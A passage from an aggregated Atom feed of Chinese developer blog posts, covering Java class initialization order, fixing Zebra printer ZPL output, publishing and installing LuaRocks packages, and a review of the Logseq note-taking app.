&lt;/template&gt;</code></pre><p>跟大佬聊了一下，我的观点主要是这样的：</p><ul><li>我对这提案的看法，和对 Svelte 的看法类似，甚至我都觉得 Evan You 也发现了编译器可能是个未来的优化点。</li><li>至于它破坏了 JS 语义的问题，我觉得与其让 Label 这个语法被忘记，不如赋予它新的意义，因为目前写 JS 已经基本离不开编译器了（例如 TypeScript、JSX、Vue Loader）。</li><li>此外，语言本身就是在变化中的，JS 正是因为以前的语法不好，才有了那么多提案和 Linter。</li><li>在其它行业，Lisp 有 Clojure、Common Lisp、Scheme 这样一堆方言，Java“语系”中的 Groovy、Scala、Kotlin 也差不多能算是方言，我觉得 JS 演变出 React、Vue、Angular、Svelte 几种方言是完全合理的。</li></ul><p>之后，大佬拿出了另外一份 JS 的提案：<a href="https://github.com/rbuckton/proposal-refs">Reference (ref) declarations and expressions</a>，这样确实不会 Break the Web 了，不过看起来有点像 C 中的 <code>int const a = 1</code> 或者 Rust 中的 <code>let mut x = 5</code>，这在我看来也不是坏事。</p><p>当然，语言不可能无限添加 Feature，否则容易长成这样：<a href="https://gist.github.com/Jack-Works/829246dcae9d9d3b874d44bae5ef5e0b#file-2020-js">cRAzY eSnEXt (*all* proposals mixed in)</a>……</p>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/java-class-initialization/</id>
        <title><![CDATA[Java 类的初始化顺序]]></title>
        <updated>2021-01-05T16:16:29+08:00</updated>
        <link href="https://blog.triplez.cn/java-class-initialization/"/>
        <content type="text/html" src="https://blog.triplez.cn/java-class-initialization/"><![CDATA[<blockquote><p>
  本文实例使用的 Java 版本：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">$ java -version
  openjdk version "11.0.8" 2020-07-14
  OpenJDK Runtime Environment AdoptOpenJDK (build 11.0.8+10)
  OpenJDK 64-Bit Server VM AdoptOpenJDK (build 11.0.8+10, mixed mode)
  </code></pre>
</blockquote>
<h2>TL; DR</h2>
<p>Java 类中的初始化顺序为：</p>
<p>父类静态变量 -> 父类静态代码块 -> 子类静态变量 -> 子类静态代码块 -> 父类变量 -> 父类代码块 -> 父类构造函数 -> 子类变量 -> 子类代码块 -> 子类构造函数 。</p>
<h2>验证代码</h2>
<p>父类：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">package initOrder;

public class Parent {
    static String staticField = "parent static field";
    static {
        System.out.println(staticField);
        System.out.println("parent static code block");
    }

    String field = "parent field";
    {
        System.out.println(field);
        System.out.println("parent code block");
    }

    // constructor
    public Parent() {
        System.out.println("parent constructor");
    }

    // override function
    public void func() {
        System.out.println("parent function");
    }
}
</code></pre>
<p>子类：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">package initOrder;

public class Child extends Parent {
    static String staticField = "child static field";
    static {
        System.out.println(staticField);
        System.out.println("child static code block");
    }

    String field = "child field";
    {
        System.out.println(field);
        System.out.println("child code block 1");
    }

    // constructor
    public Child() {
        System.out.println("child constructor");
    }

    // override function
    @Override
    public void func() {
        System.out.println("child function");
    }

    public static void main(String[] args) {
        System.out.println("child main function");
        new Child();
    }

    static {
        System.out.println("child static code block 2");
    }
}
</code></pre>
<p>若我们运行 Child 中的 <code>main</code> 函数，输出如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">parent static field
parent static code block
child static field
child static code block
child static code block 2
child main function
parent field
parent code block
parent constructor
child field
child code block
child constructor
</code></pre>
<p>可见，Child 中的 <code>main</code> 函数，在静态块初始化之后，在类变量初始化之前。</p>
<p>我们在这两个类之外编写 <code>main</code> 函数，如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-java">import initOrder.Child;

public class testInitOrder {
    public static void main(String[] args) {
        System.out.println("main function start");
        Child child = new Child();
        child.func();
        System.out.println("main function end");
    }
}
</code></pre>
<p>最后输出如下：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">main function start
parent static field
parent static code block
child static field
child static code block
child static code block 2
parent field
parent code block
parent constructor
child field
child code block
child constructor
child function
main function end
</code></pre>
<p>可见，其遵循 静态变量、静态块、构造函数、变量、代码块 的初始化顺序。</p>
<h2>Reference</h2>
<ol start="1.">
<li>Java 类初始化顺序<br />
https://segmentfault.com/a/1190000004527951</li>
</ol start="1.">
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/java-class-initialization/">Java 类的初始化顺序</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2020/12/protobuf-upgrade/</id>
        <title><![CDATA[protobuf 升级后带来的一些坑]]></title>
        <updated>2020-12-27T06:53:32+08:00</updated>
        <link href="https://blog.stdioa.com/2020/12/protobuf-upgrade/"/>
        <content type="text/html" src="https://blog.stdioa.com/2020/12/protobuf-upgrade/"><![CDATA[<p>前段时间把公司某项目依赖的 <code>github.com/golang/protobuf</code> 的版本从 v1.3.3 升级到了 v1.4.2，本文记录了升级过程中遇到的一些问题。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue.html</id>
        <title><![CDATA[盲调试解决 Zebra 打印机吞纸问题的经历]]></title>
        <updated>2020-12-20T07:36:00+08:00</updated>
        <link href="https://blog.rexskz.info/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue.html"/>
        <content type="text/html" src="https://blog.rexskz.info/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue.html"><![CDATA[<p>本来我以为，前端的工作内容只需要跟浏览器打交道，最多再做一做客户端和后端；万万没想到，如标题所示，我居然需要解决打印机的问题。</p><h1>奇怪的需求</h1><p>我们有一个画面单的平台，关于这个平台，我之前已经写过几篇文章，这里就不多提了。</p><p>一天，面单的产品突然把我拉到了一个群里，因为我们的业务 PM（BPM）接到了一个紧急需求：在我们开始跟某个卖家合作时，他们提出：我们在打印面单的时候，必须支持通过一个叫 Zebra 的打印机来打印，否则就不跟我们合作。由于那是一个大卖家，因此这似乎是一个无法拒绝的需求。虽然我们完全没听说过这种打印机，还是硬着头皮上了。</p><p>经过调查发现，Zebra 打印机与一般的打印机不太一样，它无法通过系统的打印框来打印，甚至不是走的 COM 或 USB 接口，而是监听了一个 TCP 端口来与电脑通讯。发送给打印机的也不是一般的格式，而是一个叫 <a href="https://en.wikipedia.org/wiki/Zebra_Programming_Language">ZPL</a> 的私有格式，看起来像是纯文本（例子来自英文维基）：</p><pre><code class="lang-text">^XA
^LH30,60
^FO20,10
^ADN,90,50
^FDWikipedia^FS
^XZ</code></pre><p>第一眼看上去并看不懂。但通过谷歌，我们搜到了 ZPL 的各类教程，以及一个简易的预览工具：<a href="http://staging.advanced-technology-group.com/">Online ZPL Viewer</a>。</p><h1>开始调研</h1><p>在调研之初就遇到了一道选择题：是直接生成 ZPL 格式，还是通过某些中间格式来转换呢？这两种方式似乎都可行：</p><ul><li>直接生成：面单平台生成的面单原始格式是 JSON，这可以很方便的存储和导入导出。我们写了一个转换器，当需要渲染面单时，可以调用转换器将 JSON 转换为 HTML，然后再调用 Headless Chrome 将 HTML 转换为 PDF 返回给第三方。既然有这个转换器，ZPL 又是纯文本，语法还是确定的，稍微学一学 ZPL 再写一个转换器似乎是个最好的办法。</li><li>转换生成：我们团队没人接触过 ZPL，甚至我周围都找不到 Zebra 打印机的影子。如何知道预览工具与实际打印出来的差距有多大？如果有一个很成熟的库可以帮忙转换，无论是我们的支持速度，还是转换效果，都会好很多。</li></ul><p>经过与同事们的讨论，如果直接生成的话，我们有学习成本，也有不可预期的兼容问题，因此决定转换生成。</p><h1>技术方案与实现</h1><p>搜遍了全网，唯一一个可用的库是 <a href="https://github.com/kylemacfarlane/zplgrf">kylemacfarlane/zplgrf</a>，是一个 Python 库。面单平台本来已经基本从 Python 切换为 Golang 了，为了这个库，还是得再起一个 Python 服务。了解了一下这个库，它可以将 PDF 转换为一个叫 GRF 的格式，再将其转换为 ZPL，只需要很简单的代码就可以实现：</p><pre><code class="lang-python">from zplgrf import GRF
import sys

with open(sys.argv[1], 'rb') as pdf:
    data = pdf.read()
    # 203 dpi 就是 8 dpmm，一个比较低的精度
    pages = GRF.from_pdf(data, 'DEMO', dpi=203)
for grf in pages:
    print(grf.to_zpl())</code></pre><p>我随便从测试环境搞了一张面单，导出成了 PDF 文件，它长这样：</p><p><img src="https://static.rexskz.info/blog/article/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue/0.png" alt="原始 PDF" title="原始 PDF"></p><p>转换后的 ZPL，虽然里面看起来一堆 Base64，但预览出来除了糊一点以外，似乎没什么问题：</p><p><img src="https://static.rexskz.info/blog/article/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue/1.png" alt="转换后的 ZPL，使用了 8 dpmm 的精度" title="转换后的 ZPL，使用了 8 dpmm 的精度"></p><p>ZPL 的分辨率有很多选项，但高分辨率意味着转换速度慢。我们跟 BPM 合作，得知了目标用户持有的打印机型号，多次对 UAT 环境的几张真实面单采用 8 dpmm、12 dpmm、24 dpmm 的分辨率做转换并记录转换时间。经过权衡，我们决定还是采用 8 dpmm 的分辨率。</p><p>经过一段时间与卖家中心团队的联调与测试，功能顺利上了 UAT。</p><h1>卷纸问题的修复</h1><p>本来以为万事大吉，结果业务报来了一个问题：对于某一个特定型号的打印机，在打印结束后，打印机会多吐一点点纸，然后把它卷回去。所有卖家的那个型号的打印机都能稳定复现这个问题，但他们打印其它平台的 ZPL 面单就没有问题。这可能会让我们的用户感到不满，因此我们必须解决。</p><p>一个棘手的问题是，我们这边完全没有 Zebra 打印机，现买的话也太慢了。我只好硬着头皮看生成的文件，并且让 BPM 提供了一个其它平台的 ZPL，我要知道究竟是什么东西导致的。</p><p>经过对比，我发现我们生成的 ZPL 文件有一些奇怪的指令。参考了 <a href="https://www.zebra.com/content/dam/zebra/manuals/printers/common/programming/zpl-zbi2-pm-en.pdf">ZPL 指令集文档</a>，发现有个叫 <code>^MM</code> 的指令可以控制打印完成时打印机的行为，如果把它设置为 <code>R</code>，可以阻止带有卷纸控件的打印机的卷纸行为。我搜了一下那个型号的打印机（谷歌的结果排前几名的居然是我们的竞争对手 Lazada 与 Tokopedia），确实有卷纸控件，这应该就是解决方法了。</p><p>在上面的代码中，<code>GRF.from_pdf</code> 函数可以接受一个参数 <code>print_mode</code>，将其修改为 <code>R</code> 之后，卷纸问题解决了，但业务反馈说出现了错位问题……后来我找到了 Zebra 打印机的官方驱动文档，发现打印机的默认行为应当是 <code>T</code>，于是设置 <code>print_mode='T'</code>，问题解决。</p><p>由于我们与业务有一些时差，我们所做的所有尝试，业务都需要第二天才能验证，因此解决的时间稍微长了一些。</p><h1>文字模糊问题的迅速修复</h1><p>终于把需求上线了。但刚上线没多久，大量卖家就反馈文字不清晰，很多文字的部分是缺失的：</p><p><img src="https://static.rexskz.info/blog/article/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue/2.png" alt="文字有一部分缺失" title="文字有一部分缺失"></p><p><a href="https://blog.rexskz.info/barcode-scan-bug-caused-by-hardware-issue.html#toc-link-3">之前的经验</a> 立即告诉我，是纯黑白与分辨率导致的问题：这个字号的文字在 8 dpmm 的分辨率下，一部分“笔画”由于太细，会被直接转换为白色。解决方法也很简单：要么提升分辨率（花费更多时间且需要重新发版），要么加粗一下面单的文字试一试。</p><p>我们先让业务团队帮忙修改面单，将文字加粗。问题居然就解决了，效果还不错：</p><p><img src="https://static.rexskz.info/blog/article/blind-debugging-to-solve-zebra-printer-swallowing-paper-issue/3.png" alt="加粗了文字之后的效果" title="加粗了文字之后的效果"></p><p>随即，业务发来了感谢信，许多卖家感谢我们如此迅速的解决问题。</p><p>但这毕竟只是个临时的解决方法，问题的根本原因还是分辨率太低（打印机只支持纯黑白的问题我们无法解决）。为了避免以后再出现类似的问题，我们需要提供一个高分辨率的选项。经过估算，如果从 8 dpmm 提升到 12 dpmm，由于面积扩大到两倍多，转换时间应当也是两倍多。我们的后端也会与卖家中心的后端进行进一步的测试，以评估这个修改的影响范围。</p><h1>从这个需求中学到的</h1><ol><li>理论上来说，问题都是可以解决的，需要有一定的搜索技巧和探索精神。</li><li>学好英文很重要，我查的全部资料，都是没有中文的。</li><li>在必要的情况下，可能需要深入阅读官方的驱动文档或指令集文档。</li></ol><p>总的来说，也是一次不错的经历，最后问题也解决了。之后再遇到类似的需求，我应该会比这次更加从容。</p>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/publish-your-first-luarocks-package/</id>
        <title><![CDATA[发布你第一个 Luarocks 包]]></title>
        <updated>2020-12-18T15:41:57+08:00</updated>
        <link href="https://blog.triplez.cn/publish-your-first-luarocks-package/"/>
        <content type="text/html" src="https://blog.triplez.cn/publish-your-first-luarocks-package/"><![CDATA[<h2><span class="ez-toc-section" id="_rockspec">写一个 rockspec</span></h2>
<p>首先写好你准备发布的包 <del>当然是自己写好了才要发布啦</del> ，然后我们在项目根目录下写一个 rockspec 文件（用来描述 LuaRocks 包的元信息文件）。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">luarocks write_rockspec &lt;package_name&gt; &lt;package_version&gt; &lt;package_location&gt;
</code></pre>
<p>比如，我希望发布的是 <code>busted_resty</code> 的 <code>0.5.0</code> 版本，那么我需要我的项目根目录上输入以下命令来创建我的 rockspec 文件。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luarocks write_rockspec busted_resty 0.5.0 .
</code></pre>
<p>然后，你会得到一个这样的 rockspec 文件：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-lua">package = "package_name"
version = "1.0-1"
source = {
    url = "*** please add URL for source tarball, zip or repository here ***"
}
description = {
    homepage = "*** please enter a project homepage ***",
    license = "*** please specify a license ***"
}
dependencies = {
}
build = {
    type = "builtin",
    modules = {}
}
</code></pre>
<p>这里我们简单解释下其中的含义：</p>
<ul>
<li><code>package</code> ：包名称。</li>
<li><code>version</code> ：包版本，必须为 <code>&lt;数字&gt;.&lt;数字&gt;[.&lt;数字&gt;]-&lt;数字&gt;</code> 。</li>
<li><code>source</code> ：包的源代码位置，如 Git 地址等。</li>
<li><code>description</code> ：包的基本描述，以及版权协议等信息。</li>
<li><code>dependencies</code> ：与其他库的依赖关系。</li>
<li><code>build</code> ：构建具体信息，比如安装的库名。</li>
</ul>
<p>更多 rockspec 的<a href="https://github.com/luarocks/luarocks/wiki/Rockspec-format">具体细节</a>可以在 <a href="https://github.com/luarocks/luarocks/wiki">LuaRocks 的 Wiki</a> 中找到。</p>
<p>对于 <code>busted_resty</code> 的 <code>0.5.0</code> 版本（我已经事先在 Git 上打好了 <code>v0.5.0</code> 的 tag），它的 rockspec 是这样的：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-lua">package = "busted_resty"
version = "0.5.0-1"
source = {
   url = "git://github.com/Triple-Z/busted_resty",
   tag = "v0.5.0"
}
description = {
   summary = "An extra mocking layer for OpenResty in busted testing environment.",
   detailed = [[
      This module mocks the following OpenResty APIs:

      - ngx.status
      - ngx.exit
      - ngx.exec
      - ngx.redirect
      - ngx.send_headers
      - ngx.headers_sent
      - ngx.print
      - ngx.say
      - ngx.flush
      - ngx.eof
      - ngx.is_subrequest
      - ngx.on_abort
      - ngx.arg.*
      - ngx.var.*
      - ngx.header.*
      - ngx.location.*
      - ngx.req.*
      - ngx.resp.*
   ]],
   homepage = "https://github.com/Triple-Z/busted_resty",
   license = "MIT"
}
dependencies = {
   'lua &gt;= 5.1',
   'luassert &gt;= 1.7.8',
}
build = {
   type = "builtin",
   modules = {
      busted_resty = "src/busted_resty.lua"
   }
}
</code></pre>
<p>其中，<code>modules</code> 代表着文件的安装方式及位置。如在 <code>busted_resty</code> 中，安装方式为 <code>builtin</code> ，因此 LuaRocks 只是将这些指定的文件复制粘贴到某个指定的位置。比如，库中的 <code>src/busted_resty.lua</code> 就会被复制到 LuaRocks 中 Lua 库的根目录。</p>
<h2><span class="ez-toc-section" id="_rockspec-2">检查 rockspec 语法</span></h2>
<p>写好了 rockspec 后，我们可以来检查下 rockspec 的语法是否正确。当然，使用的是 <code>luarocks lint</code> 命令。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luarocks lint busted_resty-0.5.0-1.rockspec
</code></pre>
<p>如果按下 <kbd>Enter</kbd> 后什么都没发生，恭喜你，没有消息就是好消息（毕竟是高深莫测的 UNIX 哲学 ）。</p>
<p>如果有信息输出，那就按照错误提示改吧 。</p>
<h2><span class="ez-toc-section" id="MAKE">MAKE!</span></h2>
<p>当我们编写好了 rockspec 后，就可以尝试构建属于我们自己的第一个 LuaRocks 包了！怎么构建呢，当然是用 LuaRocks 中的 <code>make</code> 命令啦！</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luarocks make
</code></pre>
<p>不出意外的话，你第一个 LuaRocks 包应该被 LuaRocks 安装到了指定的位置，快打开你最喜欢的 Lua 解释器，试一下吧！</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luajit
&gt; require "busted_resty"
</code></pre>
<p>如果什么也没有发生，那可就太好了！说明我们的 LuaRocks 包已经被安装到了本地环境上了！</p>
<h2><span class="ez-toc-section" id="i">打包并上传</span></h2>
<p>最后，那当然就是最激动人心的环节：将我们的包发布到 LuaRocks 上。</p>
<p>你可以先打包，验证包是否正确：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luarocks pack &lt;rockspec_file&gt;
</code></pre>
<p>在我们的例子中，即为：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luarocks pack busted_resty-0.5.0-1.rockspec
</code></pre>
<p>执行完打包命令后，你会在目录下看到一个后缀为 <code>.src.rock</code> 的文件。没错，那就是我们的 LuaRocks 包。</p>
<p>接下来你有两种方式来将我们刚打出来的 LuaRocks 包上传至 LuaRocks 中心仓库，让我们分别介绍它们吧。</p>
<h3><span class="ez-toc-section" id="_rock">直接在网站上上传 rock</span></h3>
<p>你可以直接在 <a href="https://luarocks.org/upload">LuaRocks 网站</a>上上传你的 rockspec 描述文件以及 src.rock 包。点击“提交”即可在 LuaRocks 上发布你的 rock 包～</p>
<h3><span class="ez-toc-section" id="i-2">用命令行上传</span></h3>
<p>使用 <code>luarocks upload</code> 即可帮你打包并直接上传至 LuaRocks 中心仓库：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ luarocks upload [--api-key=&lt;api-key&gt;] &lt;rockspec_file&gt;
</code></pre>
<p>别忘了 API Key 哦，在<a href="https://luarocks.org/settings/api-keys">这里</a>可以获取你自己的 API Key。</p>
<p><img src="https://triplez-public-1251926021.cos.ap-shanghai.myqcloud.com/picgoimage-20201218233542394.png" alt="image-20201218233542394" /></p>
<p>恭喜你，成功上传了自己的第一个 LuaRocks 包！</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/publish-your-first-luarocks-package/">发布你第一个 Luarocks 包</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/install-lua-and-luarocks-in-macos/</id>
        <title><![CDATA[macOS 上安装 Lua 及 Luarocks]]></title>
        <updated>2020-12-13T15:38:20+08:00</updated>
        <link href="https://blog.triplez.cn/install-lua-and-luarocks-in-macos/"/>
        <content type="text/html" src="https://blog.triplez.cn/install-lua-and-luarocks-in-macos/"><![CDATA[<p>[TOC]</p>
<h2><span class="ez-toc-section" id="Homebrew">Homebrew</span></h2>
<p>Lua、LuaJIT 和 Luarocks 都可以直接通过 <code>brew</code> 包管理直接安装，而且可以处理不同版本的 Luarocks，使用的仓库为 <a href="https://github.com/mesca/homebrew-luarocks">mesca/homebrew-luarocks</a> 。</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ brew tap mesca/luarocks
</code></pre>
<blockquote><p>
  Lua 5.1, 5.3 都需要在 Homebrew 中添加 <code>mesca/luarocks</code> 仓库。
</p></blockquote>
<h3><span class="ez-toc-section" id="Lua_51">Lua 5.1</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># Lua 5.1
$ brew install lua51
$ brew install luarocks51
</code></pre>
<p>使用方式：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># 进入 Lua 5.1 REPL
$ lua5.1
# 使用 Lua 5.1 的 Luarocks
$ luarocks-5.1 --version
</code></pre>
<h3><span class="ez-toc-section" id="LuaJIT">LuaJIT</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># LuaJIT
$ brew install luajit
$ brew install luarocks51 --with-luajit
</code></pre>
<p>使用方式：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># 进入 LuaJIT REPL
$ luajit
# LuaJIT 与 Lua 5.1 共用 Luarocks
$ luarocks-5.1 --version
</code></pre>
<h3><span class="ez-toc-section" id="Lua_53">Lua 5.3</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># Lua 5.3
$ brew install lua53
$ brew install luarocks53
</code></pre>
<p>使用方式：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># 进入 Lua 5.3 REPL
$ lua5.3
# 使用 Lua 5.3 的 Luarocks
$ luarocks-5.3 --version
</code></pre>
<h3><span class="ez-toc-section" id="Lua_54_Current">Lua 5.4 (Current)</span></h3>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># Current: 5.4
$ brew install lua
$ brew install luarocks
</code></pre>
<p>使用方式：</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash"># 进入 Lua 5.4 REPL
$ lua
# 使用 Lua 5.4 的 Luarocks
$ luarocks --version
</code></pre>
<h2><span class="ez-toc-section" id="Build_from_Source">Build from Source</span></h2>
<p>请参照 <a href="https://github.com/luarocks/luarocks/wiki/Installation-instructions-for-Unix">Luarocks 官方安装指南</a> 。或者 <a href="https://openresty.org/en/using-luarocks.html">OpenResty 文档中关于 Luarocks 的内容</a> 。</p>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/install-lua-and-luarocks-in-macos/">macOS 上安装 Lua 及 Luarocks</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/12/06/review-of-logseq/</id>
        <title><![CDATA[Logseq：开源优雅的知识管理工具]]></title>
        <updated>2020-12-13T06:40:34+08:00</updated>
        <link href="https://cosmosning.github.io/2020/12/06/review-of-logseq/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/12/06/review-of-logseq/"><![CDATA[<figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/altumcode-GVASc0_Aam0-unsplash.jpg" alt="题图" /><figcaption>题图</figcaption></figure><h1 id="前言">前言</h1><p>笔记，对于我个人来说，是一个非常重要的整理与回顾知识的工具。找到适合自己的笔记载体，将会极大地提高的效率。为追求最佳效率，我尝试过多种方式，从手写到电子，从文档到导图。它们各具特色，又难免缺失某种特性而使我最终放弃。</p><h2 id="印象笔记">印象笔记</h2><p>16年，新买的笔记本电脑上预装了印象笔记。当时的印象笔记还仅支持富文本编辑模式。富文本编辑意味着所见即所得，格式可以轻松地点击菜单按钮随时调整。</p><p>但是对于我来说，这就意味着我将要腾出一只手握住鼠标，在需要时调整格式。这其实会降低笔记的效率，因为这种模式下，你不仅仅要关注笔记的内容，而且需时不时地分心调整格式。这与我追求高效的笔记体验背道而驰。</p><p>除此以外，在富文本模式下，公式的输入非常繁琐，这也是我最终放弃印象笔记的原因之一。</p><p>虽然，印象笔记在 18 年开始支持 Markdown，但其编辑、预览双屏的设计，对于追求简洁的我太过复杂，也就没有再拾起。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/yinxiang-markdown.png" alt="印象笔记 Markdown 双屏设计" /><figcaption>印象笔记 Markdown 双屏设计</figcaption></figure><h2 id="typora">Typora</h2><p>18 年左右，经朋友推荐，了解到 <a href="https://typora.io/" target="_blank" rel="noopener">Typora</a> 这款简洁的 Markdown 编辑器，并一直使用至今。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/typora.png" alt="Typora:所见即所得" /><figcaption>Typora:所见即所得</figcaption></figure><p>Typora 主要令我喜爱的一点是其“<strong>所见即所得</strong>”的即时 Markdown 渲染。该软件只用一屏，既提供了 Markdown 的排版功能，又减去了编辑模式下 Markdown 中的影响阅读体验的格式符号。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/fences.png" alt="Typora 代码块" /><figcaption>Typora 代码块</figcaption></figure><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/math.png" alt="Typora 数学公式" /><figcaption>Typora 数学公式</figcaption></figure><p>然而，Typora 只是一个编辑器，只能记录，<strong>难以检索和回顾</strong>。因此，仅靠 Typora ，难以完成笔记的完整闭环。一种常见的工作流可以勉强解决这个问题，即 Typora（编辑）+ Hexo（生成静态博客网页）+ GitHub Pages（发布与检索）。然而，笔记的<strong>私密性</strong>和博客的<strong>开放性</strong>的矛盾无法得到有效解决，这使我陷入了两难的境地。</p><h2 id="幕布">幕布</h2><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/mubu.png" alt="幕布" /><figcaption>幕布</figcaption></figure><p>20 年，准备考研复试的专业课时，我开始尝试幕布这个在线笔记软件。对于整理概念性的知识，幕布绝对是一个非常强大的工具。将一门课，一本书化为一个个知识点，并通过层次表达它们的关系，最后还能生成相应的思维导图，这个笔记体验真的是太美妙了。</p><p>美中不足的是，幕布并<strong>不支持公式和代码块的渲染</strong>，这对于有大量公式代码笔记需求的我来说有点遗憾。</p><h2 id="logseq">Logseq</h2><p>最近，在 GitHub 上发现了一款开源笔记应用，<a href="https://github.com/logseq/logseq" target="_blank" rel="noopener">Logseq</a>，个人感觉比较完美的满足了我的几点需求：</p><ol type="1"><li>支持 Markdown，并且所见即所得 ；</li><li>支持公式和代码块渲染；</li><li>保持笔记的私密性。</li></ol><p>下一部分，我将聊一聊我对 Logseq 的使用体验。</p><h1 id="logseq-初体验">Logseq 初体验</h1><h2 id="快速上手">快速上手</h2><p>使用 Logseq 非常简单，只需要你拥有一个浏览器，一个 GitHub 账户及笔记仓库。</p><div class="note info"><p>如果要保持你笔记的私密性，你可以创建一个<strong>私有</strong>的 GitHub 笔记仓库供 Logseq 存储数据文件。</p></div><p>当你，准备好上述要求，只需访问 <a href="https://logseq.com/" target="_blank" rel="noopener">https://logseq.com/</a> ，并使用 Github 登录授权，设置好笔记仓库，就可以开始你的笔记了。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/daily-notes.PNG" alt="Logseq默认界面" /><figcaption>Logseq默认界面</figcaption></figure><p>登陆后，Logseq 会默认创建一个标题为今天的文件，你可以直接在此开始笔记。如果要创建新的页面，你可以在左上的搜索框输入新页面的文件名，并选择相应的下拉选项，完成创建。</p><h2 id="体验感受">体验感受</h2><p>从我的使用体验来说，Logseq 的手感是十分惊艳的。主要有如下几点：</p><ul><li><strong>快速笔记</strong><ul><li>十分类似于幕布的高效的笔记手感</li></ul></li><li><strong>数据完全属于你</strong><ul><li>Logseq 不保存你的任何数据。它在运行过程中，仅仅将你的数据缓存在浏览器的本地缓存中，并与你设定的 GitHub 仓库同步。</li></ul></li><li><strong>强大的页面引用、块引用</strong><ul><li>受 <a href="https://roamresearch.com/" target="_blank" rel="noopener">Roam</a> 启发</li><li>这建立了独立的笔记文件之间的联系，更利于笔记整合成知识库。</li></ul></li><li><strong>支持 Markdown，并且所见即所得</strong></li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/markdown-support.png" alt="Logseq 中 Markdown 支持情况" /><figcaption>Logseq 中 Markdown 支持情况</figcaption></figure><ul><li><strong>丰富的命令</strong><ul><li>键入 <code>/</code> （slash 键），你会发现一个全新的大陆：可以创建待办事项、插入页面引用或者块引用，甚至还能在其中插入一个画图的页面。</li></ul></li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/commands.PNG" alt="Logseq 中的命令" /><figcaption>Logseq 中的命令</figcaption></figure><h2 id="使用场景">使用场景</h2><p>在我看来，Logseq 具有非常丰富的使用场景：</p><ul><li><strong>自由写作</strong>：你可以在 Logseq 写下任何你思想的火花，供日后整理。</li><li><strong>待办事项</strong>：Logseq 提供了比较丰富的待办事项功能，包括创建待办事项，设置事项优先级，设定 deadline 和 schedule。</li><li><strong>知识整理</strong>：这也许是 Logseq 最核心的使用方式之一。</li><li>...（也许还有更多）</li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/deadline-and-schedule.png" alt="Logseq 的 deadline 和 schedule" /><figcaption>Logseq 的 deadline 和 schedule</figcaption></figure><h1 id="从内联到外联">从内联到外联</h1><p>传统的笔记软件，通常把笔记独立为一个一个文件，关注一个文件内的内在联系，而忽视了不同笔记之间的联系。</p><p>Logseq 受 Roam 启发，将不同的笔记文件通过<strong>页面引用</strong>联系起来，从而更好地构建自己的知识网络。</p><figure><img 